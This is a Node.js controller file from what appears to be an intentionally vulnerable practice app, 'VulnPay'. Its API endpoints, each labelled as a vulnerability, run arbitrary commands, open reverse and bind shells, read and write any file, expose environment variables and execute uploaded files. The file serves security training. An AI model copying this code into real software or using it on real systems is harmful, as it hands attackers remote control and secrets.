const { exec, spawn } = require('child_process');
const net = require('net');
const os = require('os');
const fs = require('fs');
const path = require('path');
const { logActivity } = require('../middleware/logger');

// VULNERABILITY: Remote Code Execution via API
class ShellController {
  
  // VULNERABILITY: Direct command execution without validation
  static async executeCommand(req, res) {
    try {
      const { command } = req.body;
      
      if (!command) {
        return res.status(400).json({
          success: false,
          message: 'Command is required'
        });
      }
      
      // VULNERABILITY: Logging the command
      console.log('⚠️  Executing command:', command);
      
      // VULNERABILITY: Direct execution of user input
      exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
        if (error) {
          return res.json({
            success: false,
            error: error.message,
            stderr: stderr,
            command: command
          });
        }
        
        res.json({
          success: true,
          output: stdout,
          stderr: stderr,
          command: command
        });
      });
      
      // Log activity
      if (req.user) {
        await logActivity(req.user.id, 'COMMAND_EXECUTED', { command }, req);
      }
      
    } catch (error) {
      console.error('❌ Command execution error:', error);
      res.status(500).json({
        success: false,
        message: 'Command execution failed',
        error: error.message
      });
    }
  }
  
  // VULNERABILITY: Reverse shell connection
  static async createReverseShell(req, res) {
    try {
      const { host, port } = req.body;
      
      if (!host || !port) {
        return res.status(400).json({
          success: false,
          message: 'Host and port are required'
        });
      }
      
      console.log(`⚠️  Creating reverse shell to ${host}:${port}`);
      
      // VULNERABILITY: Reverse shell implementation
      const client = new net.Socket();
      
      client.connect(port, host, () => {
        console.log('✅ Reverse shell connected');
        
        // Send initial info
        const info = {
          hostname: os.hostname(),
          platform: os.platform(),
          arch: os.arch(),
          user: os.userInfo().username,
          cwd: process.cwd(),
          pid: process.pid,
          nodeVersion: process.version
        };
        
        client.write(JSON.stringify(info) + '\n');
        client.write('VulnPay Shell Ready\n$ ');
      });
      
      let buffer = '';
      
      client.on('data', (data) => {
        const command = data.toString().trim();
        buffer += command;
        
        if (command.includes('\n') || command.includes('\r')) {
          const cmd = buffer.trim();
          buffer = '';
          
          if (cmd === 'exit') {
            client.destroy();
            return;
          }
          
          // Execute command
          exec(cmd, { timeout: 30000 }, (error, stdout, stderr) => {
            if (error) {
              client.write(`Error: ${error.message}\n`);
            } else {
              client.write(stdout);
              if (stderr) {
                client.write(`stderr: ${stderr}\n`);
              }
            }
            client.write('$ ');
          });
        }
      });
      
      client.on('error', (error) => {
        console.error('❌ Reverse shell error:', error);
      });
      
      client.on('close', () => {
        console.log('🔴 Reverse shell closed');
      });
      
      res.json({
        success: true,
        message: 'Reverse shell initiated',
        target: `${host}:${port}`
      });
      
      // Log activity
      if (req.user) {
        await logActivity(req.user.id, 'REVERSE_SHELL_CREATED', { host, port }, req);
      }
      
    } catch (error) {
      console.error('❌ Reverse shell error:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to create reverse shell',
        error: error.message
      });
    }
  }
  
  // VULNERABILITY: File system access
  static async listFiles(req, res) {
    try {
      const { directory } = req.query;
      const targetDir = directory || process.cwd();
      
      console.log('⚠️  Listing directory:', targetDir);
      
      // VULNERABILITY: No path validation
      fs.readdir(targetDir, { withFileTypes: true }, (error, files) => {
        if (error) {
          return res.status(500).json({
            success: false,
            error: error.message
          });
        }
        
        const fileList = files.map(file => ({
          name: file.name,
          isDirectory: file.isDirectory(),
          isFile: file.isFile()
        }));
        
        res.json({
          success: true,
          directory: targetDir,
          files: fileList
        });
      });
      
    } catch (error) {
      console.error('❌ List files error:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to list files',
        error: error.message
      });
    }
  }
  
  // VULNERABILITY: File read
  static async readFile(req, res) {
    try {
      const { filepath } = req.query;
      
      if (!filepath) {
        return res.status(400).json({
          success: false,
          message: 'Filepath is required'
        });
      }
      
      console.log('⚠️  Reading file:', filepath);
      
      // VULNERABILITY: No path validation (path traversal)
      fs.readFile(filepath, 'utf8', (error, data) => {
        if (error) {
          return res.status(500).json({
            success: false,
            error: error.message
          });
        }
        
        res.json({
          success: true,
          filepath: filepath,
          content: data
        });
      });
      
    } catch (error) {
      console.error('❌ Read file error:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to read file',
        error: error.message
      });
    }
  }
  
  // VULNERABILITY: File write
  static async writeFile(req, res) {
    try {
      const { filepath, content } = req.body;
      
      if (!filepath || content === undefined) {
        return res.status(400).json({
          success: false,
          message: 'Filepath and content are required'
        });
      }
      
      console.log('⚠️  Writing file:', filepath);
      
      // VULNERABILITY: No path validation
      fs.writeFile(filepath, content, 'utf8', (error) => {
        if (error) {
          return res.status(500).json({
            success: false,
            error: error.message
          });
        }
        
        res.json({
          success: true,
          message: 'File written successfully',
          filepath: filepath
        });
      });
      
    } catch (error) {
      console.error('❌ Write file error:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to write file',
        error: error.message
      });
    }
  }
  
  // VULNERABILITY: System information
  static async getSystemInfo(req, res) {
    try {
      const systemInfo = {
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        cpus: os.cpus().length,
        totalMemory: os.totalmem(),
        freeMemory: os.freemem(),
        uptime: os.uptime(),
        user: os.userInfo(),
        networkInterfaces: os.networkInterfaces(),
        env: process.env, // VULNERABILITY: Exposing environment variables
        cwd: process.cwd(),
        pid: process.pid,
        nodeVersion: process.version
      };
      
      res.json({
        success: true,
        system: systemInfo
      });
      
    } catch (error) {
      console.error('❌ System info error:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to get system info',
        error: error.message
      });
    }
  }
  
  // VULNERABILITY: Upload and execute
  static async uploadAndExecute(req, res) {
    try {
      const { filename, content, execute } = req.body;
      
      if (!filename || !content) {
        return res.status(400).json({
          success: false,
          message: 'Filename and content are required'
        });
      }
      
      const filepath = path.join(os.tmpdir(), filename);
      
      console.log('⚠️  Uploading file:', filepath);
      
      // Write file
      fs.writeFileSync(filepath, content);
      
      // Make executable on Unix systems
      if (os.platform() !== 'win32') {
        fs.chmodSync(filepath, '755');
      }
      
      let output = null;
      
      // Execute if requested
      if (execute) {
        console.log('⚠️  Executing uploaded file');
        
        const result = await new Promise((resolve, reject) => {
          exec(filepath, { timeout: 30000 }, (error, stdout, stderr) => {
            if (error) {
              resolve({ error: error.message, stderr });
            } else {
              resolve({ stdout, stderr });
            }
          });
        });
        
        output = result;
      }
      
      res.json({
        success: true,
        message: 'File uploaded successfully',
        filepath: filepath,
        executed: execute,
        output: output
      });
      
    } catch (error) {
      console.error('❌ Upload and execute error:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to upload/execute file',
        error: error.message
      });
    }
  }
  
  // VULNERABILITY: Bind shell (listening mode)
  static async createBindShell(req, res) {
    try {
      const { port } = req.body;
      
      if (!port) {
        return res.status(400).json({
          success: false,
          message: 'Port is required'
        });
      }
      
      console.log(`⚠️  Creating bind shell on port ${port}`);
      
      const server = net.createServer((socket) => {
        console.log('✅ Client connected to bind shell');
        
        socket.write('VulnPay Bind Shell\n$ ');
        
        let buffer = '';
        
        socket.on('data', (data) => {
          const command = data.toString().trim();
          buffer += command;
          
          if (command.includes('\n') || command.includes('\r')) {
            const cmd = buffer.trim();
            buffer = '';
            
            if (cmd === 'exit') {
              socket.destroy();
              return;
            }
            
            exec(cmd, { timeout: 30000 }, (error, stdout, stderr) => {
              if (error) {
                socket.write(`Error: ${error.message}\n`);
              } else {
                socket.write(stdout);
                if (stderr) {
                  socket.write(`stderr: ${stderr}\n`);
                }
              }
              socket.write('$ ');
            });
          }
        });
        
        socket.on('close', () => {
          console.log('🔴 Client disconnected from bind shell');
        });
      });
      
      server.listen(port, '0.0.0.0', () => {
        console.log(`✅ Bind shell listening on port ${port}`);
      });
      
      res.json({
        success: true,
        message: 'Bind shell created',
        port: port
      });
      
    } catch (error) {
      console.error('❌ Bind shell error:', error);
      res.status(500).json({
        success: false,
        message: 'Failed to create bind shell',
        error: error.message
      });
    }
  }
}

module.exports = ShellController;